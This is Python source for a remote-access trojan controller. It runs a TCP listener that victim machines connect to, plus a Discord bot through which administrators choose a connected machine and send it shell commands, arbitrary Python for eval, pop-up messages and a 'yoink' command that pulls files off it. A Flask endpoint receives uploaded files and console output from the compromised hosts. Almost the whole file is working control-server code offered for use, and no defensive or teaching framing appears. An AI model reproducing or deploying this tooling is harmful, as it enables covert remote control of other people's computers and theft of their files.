import asyncio, json, discord, logging, socket, os, threading, time, flask
from discord.ext import commands



default_config = {
    "output_channel_id": 0,
    "new_client_alert_channel_id": 0,
    "command_prefix": ".",
    "bot_token": "your-token-here",
}
# create config if nonexistent
if not os.path.exists("config.json"):
    with open("config.json", "w+") as file:
        json.dump(default_config, file, indent=4)

#load config
with open("config.json", "r") as file:
    config = json.load(file)
TOKEN = config["bot_token"]
channel_id = config["output_channel_id"]
alert_channel = config["new_client_alert_channel_id"]
prefix = config["command_prefix"]

# this is a mess, help
connected_clients = {}
client_names = []
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 44))
s.listen(11)
current_thread = None
client_id = 0
current_message = ""
sent_messages = {}
message_queue = ""
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, intents=intents)
app = flask.Flask(__name__)

# this sends every console output message to discord
# (this is a big bowl of spaghetti)
def message_loop():
    global message_queue
    global current_message
    while True:
        if len(message_queue) == 0:
            time.sleep(1)
            continue
        channel = bot.get_channel(channel_id)
        if channel:
            time.sleep(0.01)
            new_message = message_queue
            if str(channel_id) in sent_messages:
                if len(current_message) < 1900:
                    message_to_add = new_message[:1900-len(current_message)]
                    message_queue = message_queue[1900-len(current_message):]
                    current_message += message_to_add
                    message = sent_messages[str(channel_id)]
                    asyncio.run_coroutine_threadsafe(message.edit(content="```"+current_message+"```"), bot.loop)

                    print(f"str(channel_id) in sent_messages, len(current_message) < 1900: len(message queue) = {len(message_queue)}")
                else:
                    current_message = new_message[:1900]
                    message_object = asyncio.run_coroutine_threadsafe(channel.send("```"+current_message+"```"), bot.loop).result()
                    sent_messages[str(channel_id)] = message_object
                    message_queue = message_queue[len(new_message[0:1900]):]
                    print(f"str(channel_id) in sent_messages, len(current_message) > 1900: len(message queue) = {len(message_queue)}")
            else:
                current_message = new_message[:1900]
                message_object = asyncio.run_coroutine_threadsafe(channel.send("```"+current_message+"```"), bot.loop).result()
                sent_messages[str(channel_id)] = message_object
                message_queue = message_queue[len(new_message[0:1900]):]
                print(f"str(channel_id) not in sent_messages: len(message queue) =  {len(message_queue)}")
        # print(message_queue)

# check if all the clients are online
def keepalive():
    global connected_clients
    global client_names
    global current_thread
    while True:
        time.sleep(1)
        for item in connected_clients:
            try:
                connected_clients[item]["socket"].send(b"CONNECTED?")
            except OSError:
                channel = bot.get_channel(alert_channel)
                asyncio.run_coroutine_threadsafe(
                    channel.send(f"A CLIENT DISCONNECTED!\n```\nIP: {connected_clients[item]['ip']}\nCONNECTION ID: {item}\n```"),
                    bot.loop)
                del connected_clients[item]
                client_names.remove(item)
                if current_thread == item:
                    current_thread = None
                break


def add_to_message_queue(message):
    global message_queue
    message_queue += message
    print(message)



# this part of the code handles file uploads
@app.route("/upload", methods=['POST'])
def upload_file():
    uploaded_file = flask.request.files['file']
    if uploaded_file.filename != '':
        uploaded_file.save("upload/"+uploaded_file.filename)
    return 'OK', 200

# this part of the code handles console output from our client
@app.route("/console_output", methods=['POST'])
def console():
    data = flask.request.json
    add_to_message_queue(data["message"])
    return 'OK', 200


# an infinite loop to accept new clients
def accept_thread():
    global connected_clients
    global client_names
    global client_id
    while True:
        client, client_addr = s.accept()
        # get system info from the client (this is an eval() command)
        client.send(b"python getSystemInfo()")
        info = client.recv(262144).decode()
        # add the client to the connected_clients dict
        connected_clients[str(client_id+1)] = {"socket": client, "ip": client_addr[0], "info": info}
        # this is a duplicate of the above line, but stores only the client name
        client_names.append(str(client_id+1))
        client_id += 1
        # send the alert message on discord
        channel = bot.get_channel(alert_channel)
        asyncio.run_coroutine_threadsafe(channel.send(f"A NEW CLIENT CONNECTED!\n```\nIP: {client_addr[0]}\nCONNECTION ID: {client_id}\n```"), bot.loop)


# list all the connected clients
@bot.command()
async def ls(ctx):
    author = ctx.message.author
    if not author.guild_permissions.administrator:
        await ctx.send("```\nYou don't have permission to do this\n```")
        return
    await ctx.send(f"```\nActive clients:\n{'; '.join(client_names)}\n```")


# select a client to run commands
@bot.command()
async def sd(ctx, *args):
    author = ctx.message.author
    if not author.guild_permissions.administrator:
        await ctx.send("```\nYou don't have permission to do this\n```")
        return
    thread_id = " ".join(args)
    if thread_id == "":
        await ctx.send(f"```\nUsage: {prefix}sd <connection ID>\n```")
        return
    if thread_id in connected_clients:
        global current_thread
        current_thread = str(thread_id)
        await ctx.send(f"```\nChanged current client to {thread_id}\n```")
    else:
        await ctx.send("```\nClient does not exist!\n```")


# get client info of a connection ID
@bot.command()
async def info(ctx, *args):
    author = ctx.message.author
    # permission check
    if not author.guild_permissions.administrator:
        await ctx.send("```\nYou don't have permission to do this\n```")
        return
    # check if there is a client selected
    if current_thread == None:
        await ctx.send(f"```\nSelect a client first!\n```")
        return
    thread_id = " ".join(args)
    # check if the command is entered correctly
    if thread_id == "":
        await ctx.send(f"```\nUsage: {prefix}info <connection ID>\n```")
        return
    # get client info
    client_info = [f"Client ID: {thread_id}", f"IP: {connected_clients[thread_id]['ip']}"]
    a = json.loads(connected_clients[thread_id]["info"])
    for item in a:
        value = a[item]
        client_info.append(f"{item}: {value}")
    await ctx.send(f"```\n"+'\n'.join(client_info)+"\n```")


# execute a shell command
@bot.command()
async def exec(ctx, *args):
    global current_thread
    global client_names
    # permission check
    author = ctx.message.author
    if not author.guild_permissions.administrator:
        await ctx.send("```\nYou don't have permission to do this\n```")
        return
    # check if there is a client selected
    if current_thread == None:
        await ctx.send(f"```\nSelect a client first!\n```")
        return
    # check command usage
    if " ".join(args) == "":
        await ctx.send(f"```\nUsage: {prefix}exec <command>\n```")
        return

    try:
        # delete the last saved message, force the program to create new message
        del sent_messages[str(channel_id)]
    except:
        pass
    cmd = " ".join(args).replace('"', "'").split()
    try:
        # send the command to the client
        connected_clients[current_thread]["socket"].send(b"exec " + " ".join(cmd).encode())
    except OSError:
        # this gets executed if the client is unreachable
        await ctx.send("```\nFailed to send command!\n```")
        del connected_clients[current_thread]
        client_names.remove(current_thread)
        current_thread = None


# download a file
@bot.command()
async def download(ctx, *args):
    global current_thread
    author = ctx.message.author
    if not author.guild_permissions.administrator:
        await ctx.send("```\nYou don't have permission to do this\n```")
        return
    if current_thread == None:
        await ctx.send(f"```\nSelect a client first!\n```")
        return
    if " ".join(args) == "":
        await ctx.send(f"```\nUsage: {prefix}download <path>\n```")
        return
    try:
        # send the command to the client
        connected_clients[current_thread]["socket"].send(b"yoink " + " ".join(args).encode())
        # wait for a response
        resp = connected_clients[current_thread]["socket"].recv(262144).decode()
        message = list(resp[i:i + 1900] for i in range(0, len(resp), 1900))
        for part in message:
            await ctx.send(f"```\n{part}\n```")
    except OSError:
        # this gets executed if the client is unreachable
        await ctx.send("```\nFailed to send command!\n```")
        del connected_clients[current_thread]
        client_names.remove(current_thread)
        current_thread = None


# run a python command
@bot.command()
async def eval(ctx, *args):
    global current_thread
    author = ctx.message.author
    # checks before executing the command
    if not author.guild_permissions.administrator:
        await ctx.send("```\nYou don't have permission to do this\n```")
        return
    if current_thread == None:
        await ctx.send(f"```\nSelect a client first!\n```")
        return
    if " ".join(args) == "":
        await ctx.send(f"```\nUsage: {prefix}eval <python code that can be ran with eval()>\n```")
        return
    try:
        # send the eval() command to the client
        connected_clients[current_thread]["socket"].send(b"python " + " ".join(args).encode())
        # wait for a response
        resp = connected_clients[current_thread]["socket"].recv(262144).decode()
        message = list(resp[i:i + 1900] for i in range(0, len(resp), 1900))
        for part in message:
            await ctx.send(f"```\n{part}\n```")
            time.sleep(0.05)
    except OSError:
        # if the client is unreachable
        await ctx.send("```\nFailed to send command!\n```")
        del connected_clients[current_thread]
        client_names.remove(current_thread)
        current_thread = None

# display a message (as an info window) for the client
@bot.command()
async def message(ctx, *args):
    # checks before executing the command
    author = ctx.message.author
    if not author.guild_permissions.administrator:
        await ctx.send("```\nYou don't have permission to do this\n```")
        return
    if current_thread == None:
        await ctx.send(f"```\nSelect a client first!\n```")
        return
    if " ".join(args) == "":
        await ctx.send(f"```\nUsage: {prefix}message <message>\n```")
        return

    # send the message to the client
    connected_clients[current_thread]["socket"].send(b"message "+" ".join(args).encode())


def http_server():
    app.run(debug=False, host="0.0.0.0", port=43)

# this is a mess
threading.Thread(target=accept_thread).start()
threading.Thread(target=http_server).start()
threading.Thread(target=message_loop).start()
threading.Thread(target=keepalive).start()
log = logging.getLogger('werkzeug')
log.setLevel(logging.INFO)
bot.run(TOKEN)

# this shit is big bowl of spaghetti
